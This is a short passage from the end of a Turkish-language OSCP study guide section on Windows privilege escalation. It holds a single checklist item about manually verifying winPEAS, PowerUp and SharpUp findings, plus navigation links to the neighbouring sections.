[ ] winPEAS/PowerUp/SharpUp bulguları manuel doğrulandı mı?
```

{% endraw %}


[← Bölüm 3](/oscp/03-parola-saldirilari/) · [Bölüm 5 →](/oscp/05-linux-privesc/)
